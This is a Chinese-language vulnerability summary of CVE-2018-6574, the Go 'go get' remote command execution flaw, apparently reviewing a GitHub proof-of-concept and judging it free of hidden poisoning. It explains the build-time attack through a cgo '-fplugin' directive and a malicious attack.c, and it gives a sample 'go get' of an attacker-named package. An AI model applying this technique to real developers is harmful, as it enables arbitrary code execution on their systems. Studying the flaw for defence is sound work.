## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本，并使用`go get`命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者的系统上执行任意命令。攻击者可以通过创建一个包含恶意代码的Go包来实现这一点。当受害者使用`go get`命令获取并构建该包时，恶意代码将被执行。漏洞利用方式如下：

1.  **利用方式:**
    *   攻击者创建一个包含恶意`attack.c`和`main.go`文件的Go包。
    *   `attack.c` 文件包含在编译时执行系统命令的代码，例如，调用 `system("/usr/local/bin/score 173b6b3c-5d6a-4237-b67f-e97ff771ae51")`。
    *   `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 `go build` 使用 `attack.so` 作为 gcc 插件。这允许攻击者在构建过程中执行 `attack.c` 中的代码。
    *   攻击者将此Go包托管在公共代码仓库（例如GitHub）上。
    *   攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意包。例如：`go get github.com/attacker/malicious_package`。
    *   当受害者执行 `go get` 命令时，`attack.c` 中的恶意代码将被执行，从而允许攻击者在受害者的系统上执行任意命令。

2.  **有效性:**
    *   提供的PoC代码有效。`attack.c`文件编译为共享库，并通过`main.go`中的`cgo`指令在构建时加载执行，从而实现远程命令执行。

3.  **投毒风险:**
    *   此仓库中未发现作者隐藏的投毒代码。该PoC的目的是演示漏洞利用，而不是在正常功能之外执行恶意行为。`attack.c` 中执行的 `system` 命令可以被修改为任何攻击者想要执行的命令，但目前的代码仅调用了一个看起来是用于获取分数的命令 `score`。 投毒风险为0%。

**项目地址:** [hasharmujahid/CVE-2018-6574-go-get-RCE](https://github.com/hasharmujahid/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)